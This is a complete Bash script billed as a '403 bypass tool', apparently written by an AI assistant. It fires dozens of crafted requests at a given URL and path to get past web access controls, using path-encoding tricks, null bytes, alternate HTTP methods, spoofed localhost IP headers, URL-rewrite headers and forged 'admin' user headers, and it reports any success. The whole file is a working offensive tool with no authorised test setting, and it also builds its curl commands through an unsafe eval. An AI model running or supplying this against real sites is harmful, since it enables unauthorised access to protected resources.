#!/bin/bash

# Legendary 403 Bypass Tool - Bash Version
# Enhanced version with 50+ bypass techniques
# Author: OpenHands AI Assistant
# Version: 2.0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Global variables
TARGET_URL=""
TARGET_PATH=""
TIMEOUT=10
VERBOSE=false
OUTPUT_FILE=""
SUCCESSFUL_BYPASSES=0
TOTAL_TESTS=0

# Print banner
print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
██╗     ███████╗ ██████╗ ███████╗███╗   ██╗██████╗  █████╗ ██████╗ ██╗   ██╗
██║     ██╔════╝██╔════╝ ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
██║     █████╗  ██║  ███╗█████╗  ██╔██╗ ██║██║  ██║███████║██████╔╝ ╚████╔╝ 
██║     ██╔══╝  ██║   ██║██╔══╝  ██║╚██╗██║██║  ██║██╔══██║██╔══██╗  ╚██╔╝  
███████╗███████╗╚██████╔╝███████╗██║ ╚████║██████╔╝██║  ██║██║  ██║   ██║   
╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}                    403 BYPASS TOOL v2.0${NC}"
    echo -e "${GREEN}                 The Ultimate Forbidden Bypass${NC}"
    echo -e "${PURPLE}              Enhanced with 50+ Bypass Techniques${NC}"
    echo ""
}

# Print usage
usage() {
    echo "Usage: $0 <URL> <PATH> [OPTIONS]"
    echo ""
    echo "Arguments:"
    echo "  URL     Target URL (e.g., https://example.com)"
    echo "  PATH    Path to test (e.g., admin)"
    echo ""
    echo "Options:"
    echo "  -t, --timeout SECONDS    Request timeout (default: 10)"
    echo "  -v, --verbose           Verbose output"
    echo "  -o, --output FILE       Save results to file"
    echo "  -h, --help              Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 https://example.com admin"
    echo "  $0 https://example.com admin -t 15 -v"
    echo "  $0 https://example.com admin -o results.txt"
}

# Log function
log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "SUCCESS")
            echo -e "${GREEN}✅ [$timestamp] $message${NC}"
            ;;
        "ERROR")
            echo -e "${RED}❌ [$timestamp] $message${NC}"
            ;;
        "WARNING")
            echo -e "${YELLOW}⚠️  [$timestamp] $message${NC}"
            ;;
        "INFO")
            echo -e "${BLUE}ℹ️  [$timestamp] $message${NC}"
            ;;
        *)
            echo -e "[$timestamp] $message"
            ;;
    esac
    
    if [[ -n "$OUTPUT_FILE" ]]; then
        echo "[$timestamp] [$level] $message" >> "$OUTPUT_FILE"
    fi
}

# Test a single URL with curl
test_url() {
    local method=$1
    local url=$2
    local headers=$3
    local data=$4
    local description=$5
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # Build curl command
    local curl_cmd="curl -k -s -o /dev/null -w '%{http_code},%{size_download},%{url_effective}' --max-time $TIMEOUT"
    
    # Add method
    if [[ "$method" != "GET" ]]; then
        curl_cmd="$curl_cmd -X $method"
    fi
    
    # Add headers
    if [[ -n "$headers" ]]; then
        curl_cmd="$curl_cmd $headers"
    fi
    
    # Add data for POST requests
    if [[ -n "$data" ]]; then
        curl_cmd="$curl_cmd -d '$data'"
    fi
    
    # Add URL
    curl_cmd="$curl_cmd '$url'"
    
    # Execute curl command
    local result=$(eval $curl_cmd 2>/dev/null)
    local status_code=$(echo "$result" | cut -d',' -f1)
    local content_length=$(echo "$result" | cut -d',' -f2)
    local effective_url=$(echo "$result" | cut -d',' -f3)
    
    # Determine success
    local success=false
    local color=$RED
    local icon="❌"
    
    case $status_code in
        200|201|202|204|301|302|307|308)
            success=true
            color=$GREEN
            icon="✅"
            SUCCESSFUL_BYPASSES=$((SUCCESSFUL_BYPASSES + 1))
            ;;
        403)
            color=$RED
            icon="❌"
            ;;
        401|404|405|500|502|503)
            color=$YELLOW
            icon="⚠️ "
            ;;
        *)
            color=$BLUE
            icon="ℹ️ "
            ;;
    esac
    
    # Print result
    printf "%s [%3d/%3d] %s%3s%s | %6sB | %7s | %s\n" \
        "$icon" "$TOTAL_TESTS" "999" "$color" "$status_code" "$NC" "$content_length" "$method" "$description"
    
    # Log successful bypasses
    if [[ "$success" == true ]]; then
        log "SUCCESS" "BYPASS FOUND: [$status_code] $method $url"
        if [[ -n "$headers" ]]; then
            log "SUCCESS" "  Headers: $headers"
        fi
        if [[ -n "$data" ]]; then
            log "SUCCESS" "  Data: $data"
        fi
    fi
    
    # Verbose output
    if [[ "$VERBOSE" == true ]]; then
        log "INFO" "[$status_code] $method $url ($content_length bytes)"
    fi
    
    # Small delay to avoid overwhelming the server
    sleep 0.1
}

# URL encoding function
url_encode() {
    local string="${1}"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

# Main bypass testing function
run_bypass_tests() {
    local base_url="$TARGET_URL"
    local path="$TARGET_PATH"
    
    echo -e "\n${BOLD}🚀 Starting bypass tests for: ${CYAN}$base_url/$path${NC}"
    echo -e "${BOLD}⚡ Using timeout: ${TIMEOUT}s${NC}\n"
    
    # Reset counters
    SUCCESSFUL_BYPASSES=0
    TOTAL_TESTS=0
    
    # 1. Basic path manipulations
    echo -e "${BOLD}📁 Testing path manipulations...${NC}"
    
    test_url "GET" "$base_url/$path" "" "" "Original path"
    test_url "GET" "$base_url/%2e/$path" "" "" "Path with %2e"
    test_url "GET" "$base_url/$path/." "" "" "Path with trailing dot"
    test_url "GET" "$base_url//$path//" "" "" "Double slashes"
    test_url "GET" "$base_url/./$path/./" "" "" "Current directory references"
    test_url "GET" "$base_url/$path/.." "" "" "Parent directory"
    test_url "GET" "$base_url/$path/../$path" "" "" "Parent then target"
    test_url "GET" "$base_url/$path..;/" "" "" "Path with ..;/"
    test_url "GET" "$base_url/$path;/" "" "" "Path with semicolon"
    test_url "GET" "$base_url/$path%20" "" "" "Path with space"
    test_url "GET" "$base_url/$path%09" "" "" "Path with tab"
    test_url "GET" "$base_url/$path%0a" "" "" "Path with newline"
    test_url "GET" "$base_url/$path%0d" "" "" "Path with carriage return"
    test_url "GET" "$base_url/$path%00" "" "" "Path with null byte"
    test_url "GET" "$base_url/$path?" "" "" "Path with question mark"
    test_url "GET" "$base_url/$path#" "" "" "Path with hash"
    test_url "GET" "$base_url/$path/*" "" "" "Path with wildcard"
    test_url "GET" "$base_url/$path/?anything" "" "" "Path with query parameter"
    
    # URL encoding variations
    local encoded_path=$(url_encode "$path")
    test_url "GET" "$base_url/$encoded_path" "" "" "URL encoded path"
    test_url "GET" "$base_url/${path//\//%2f}" "" "" "Forward slash encoded"
    test_url "GET" "$base_url/${path//\//%2F}" "" "" "Forward slash encoded (uppercase)"
    
    # Case variations
    test_url "GET" "$base_url/${path^^}" "" "" "Uppercase path"
    test_url "GET" "$base_url/${path,,}" "" "" "Lowercase path"
    
    # File extensions
    echo -e "\n${BOLD}📄 Testing file extensions...${NC}"
    extensions=("html" "php" "asp" "aspx" "jsp" "json" "xml" "txt" "bak" "old" "orig")
    for ext in "${extensions[@]}"; do
        test_url "GET" "$base_url/$path.$ext" "" "" "Path with .$ext extension"
    done
    test_url "GET" "$base_url/$path~" "" "" "Path with tilde"
    
    # 2. HTTP Methods
    echo -e "\n${BOLD}🔧 Testing HTTP methods...${NC}"
    methods=("POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS" "TRACE" "CONNECT")
    for method in "${methods[@]}"; do
        test_url "$method" "$base_url/$path" "" "" "HTTP $method method"
    done
    
    # 3. Header-based bypasses
    echo -e "\n${BOLD}📋 Testing header bypasses...${NC}"
    
    # IP spoofing headers
    ip_headers=(
        "-H 'X-Forwarded-For: 127.0.0.1'"
        "-H 'X-Forwarded-For: ::1'"
        "-H 'X-Forwarded-For: localhost'"
        "-H 'X-Forwarded-For: 127.0.0.1:80'"
        "-H 'X-Real-IP: 127.0.0.1'"
        "-H 'X-Originating-IP: 127.0.0.1'"
        "-H 'X-Remote-IP: 127.0.0.1'"
        "-H 'X-Remote-Addr: 127.0.0.1'"
        "-H 'X-Client-IP: 127.0.0.1'"
        "-H 'X-Host: 127.0.0.1'"
        "-H 'X-Forwarded-Host: 127.0.0.1'"
        "-H 'X-Forwarded-Server: 127.0.0.1'"
        "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
        "-H 'X-HTTP-Host-Override: 127.0.0.1'"
        "-H 'X-Forwarded-Proto: https'"
        "-H 'X-Forwarded-Ssl: on'"
    )
    
    for header in "${ip_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "IP spoofing: $header"
    done
    
    # URL rewrite headers
    rewrite_headers=(
        "-H 'X-Original-URL: /$path'"
        "-H 'X-Rewrite-URL: /$path'"
        "-H 'X-Override-URL: /$path'"
    )
    
    for header in "${rewrite_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "URL rewrite: $header"
    done
    
    # Authorization headers
    auth_headers=(
        "-H 'X-Forwarded-User: admin'"
        "-H 'X-Remote-User: admin'"
        "-H 'X-User: admin'"
        "-H 'X-Username: admin'"
    )
    
    for header in "${auth_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "Auth bypass: $header"
    done
    
    # Content type headers
    content_headers=(
        "-H 'Content-Type: application/json'"
        "-H 'Content-Type: application/xml'"
        "-H 'Content-Type: text/plain'"
        "-H 'Accept: */*'"
        "-H 'Accept: application/json'"
    )
    
    for header in "${content_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "Content type: $header"
    done
    
    # CDN/Proxy headers
    cdn_headers=(
        "-H 'CF-Connecting-IP: 127.0.0.1'"
        "-H 'True-Client-IP: 127.0.0.1'"
        "-H 'Fastly-Client-IP: 127.0.0.1'"
        "-H 'X-Sucuri-ClientIP: 127.0.0.1'"
        "-H 'Incap-Client-IP: 127.0.0.1'"
    )
    
    for header in "${cdn_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "CDN bypass: $header"
    done
    
    # Custom headers
    custom_headers=(
        "-H 'X-Requested-With: XMLHttpRequest'"
        "-H 'X-HTTP-Method-Override: GET'"
        "-H 'X-Method-Override: GET'"
        "-H 'Cache-Control: no-cache'"
        "-H 'Pragma: no-cache'"
    )
    
    for header in "${custom_headers[@]}"; do
        test_url "GET" "$base_url/$path" "$header" "" "Custom header: $header"
    done
    
    # 4. POST data bypasses
    echo -e "\n${BOLD}📤 Testing POST data bypasses...${NC}"
    
    post_data=(
        "_method=GET"
        "method=GET"
        "X-HTTP-Method-Override=GET"
    )
    
    for data in "${post_data[@]}"; do
        test_url "POST" "$base_url/$path" "-H 'Content-Type: application/x-www-form-urlencoded'" "$data" "POST data: $data"
    done
    
    # Content-Length bypass
    test_url "POST" "$base_url/$path" "-H 'Content-Length: 0'" "" "POST with Content-Length: 0"
    
    # 5. Advanced techniques
    echo -e "\n${BOLD}🔬 Testing advanced techniques...${NC}"
    
    # Unicode normalization
    test_url "GET" "$base_url/$path%c0%af" "" "" "Overlong UTF-8 encoding"
    test_url "GET" "$base_url/$path%e0%80%af" "" "" "Overlong UTF-8 encoding (variant)"
    
    # Windows specific
    test_url "GET" "$base_url/$path\\" "" "" "Windows backslash"
    test_url "GET" "$base_url/${path//\/\\\\}" "" "" "Windows path separators"
    
    # IIS specific
    test_url "GET" "$base_url/$path::$INDEX_ALLOCATION" "" "" "IIS stream bypass"
    test_url "GET" "$base_url/$path:$i30:$INDEX_ALLOCATION" "" "" "IIS alternate data stream"
    
    # Multiple encoding
    test_url "GET" "$base_url/$path%252e" "" "" "Double URL encoding"
    test_url "GET" "$base_url/$path%25252e" "" "" "Triple URL encoding"
    
    # Null byte variations
    test_url "GET" "$base_url/%00$path" "" "" "Null byte prefix"
    test_url "GET" "$base_url/$path%00.html" "" "" "Null byte with extension"
    
    # Multiple slashes variations
    test_url "GET" "$base_url///$path" "" "" "Triple slashes"
    test_url "GET" "$base_url////$path" "" "" "Quadruple slashes"
    test_url "GET" "$base_url/$path///" "" "" "Trailing triple slashes"
}

# Check Wayback Machine
check_wayback() {
    echo -e "\n${BOLD}🕰️  Checking Wayback Machine...${NC}"
    
    local wayback_url="https://archive.org/wayback/available?url=$TARGET_URL/$TARGET_PATH"
    local result=$(curl -s --max-time 10 "$wayback_url" 2>/dev/null)
    
    if [[ -n "$result" ]] && echo "$result" | grep -q '"available":true'; then
        local archived_url=$(echo "$result" | grep -o '"url":"[^"]*"' | cut -d'"' -f4)
        local timestamp=$(echo "$result" | grep -o '"timestamp":"[^"]*"' | cut -d'"' -f4)
        
        log "SUCCESS" "Found archived version: $archived_url"
        log "INFO" "Timestamp: $timestamp"
    else
        log "WARNING" "No archived versions found"
    fi
}

# Generate report
generate_report() {
    echo -e "\n${BOLD}📊 BYPASS REPORT${NC}"
    echo "=" | tr ' ' '=' | head -c 80; echo
    
    echo -e "${BOLD}Target:${NC} $TARGET_URL/$TARGET_PATH"
    echo -e "${BOLD}Total Tests:${NC} $TOTAL_TESTS"
    echo -e "${GREEN}✅ Successful Bypasses:${NC} $SUCCESSFUL_BYPASSES"
    echo -e "${RED}❌ Failed Attempts:${NC} $((TOTAL_TESTS - SUCCESSFUL_BYPASSES))"
    
    if [[ $SUCCESSFUL_BYPASSES -gt 0 ]]; then
        echo -e "\n${BOLD}${GREEN}🎉 Found $SUCCESSFUL_BYPASSES working bypass(es)!${NC}"
        echo -e "${GREEN}Check the log above for successful bypass details.${NC}"
    else
        echo -e "\n${BOLD}${YELLOW}😞 No successful bypasses found.${NC}"
        echo -e "${YELLOW}The target might be well-protected or the path might not exist.${NC}"
    fi
    
    if [[ -n "$OUTPUT_FILE" ]]; then
        echo -e "\n${CYAN}💾 Detailed results saved to: $OUTPUT_FILE${NC}"
    fi
}

# Parse command line arguments
parse_args() {
    if [[ $# -lt 2 ]]; then
        usage
        exit 1
    fi
    
    TARGET_URL="$1"
    TARGET_PATH="$2"
    shift 2
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -o|--output)
                OUTPUT_FILE="$2"
                shift 2
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
    
    # Validate URL
    if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
        echo -e "${RED}❌ Invalid URL format. Please include http:// or https://${NC}"
        exit 1
    fi
    
    # Remove trailing slash from URL
    TARGET_URL="${TARGET_URL%/}"
    
    # Remove leading slash from path
    TARGET_PATH="${TARGET_PATH#/}"
    
    # Validate timeout
    if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]] || [[ "$TIMEOUT" -lt 1 ]]; then
        echo -e "${RED}❌ Invalid timeout value. Must be a positive integer.${NC}"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    local missing_deps=()
    
    if ! command -v curl &> /dev/null; then
        missing_deps+=("curl")
    fi
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        echo -e "${RED}❌ Missing dependencies: ${missing_deps[*]}${NC}"
        echo -e "${YELLOW}Please install the missing dependencies and try again.${NC}"
        exit 1
    fi
}

# Main function
main() {
    # Check dependencies
    check_dependencies
    
    # Parse arguments
    parse_args "$@"
    
    # Print banner
    print_banner
    
    # Initialize output file
    if [[ -n "$OUTPUT_FILE" ]]; then
        echo "Legendary 403 Bypass Tool - Report" > "$OUTPUT_FILE"
        echo "Target: $TARGET_URL/$TARGET_PATH" >> "$OUTPUT_FILE"
        echo "Timestamp: $(date)" >> "$OUTPUT_FILE"
        echo "----------------------------------------" >> "$OUTPUT_FILE"
    fi
    
    # Run bypass tests
    run_bypass_tests
    
    # Check Wayback Machine
    check_wayback
    
    # Generate report
    generate_report
}

# Trap Ctrl+C
trap 'echo -e "\n${YELLOW}⚠️  Interrupted by user${NC}"; exit 1' INT

# Run main function
main "$@"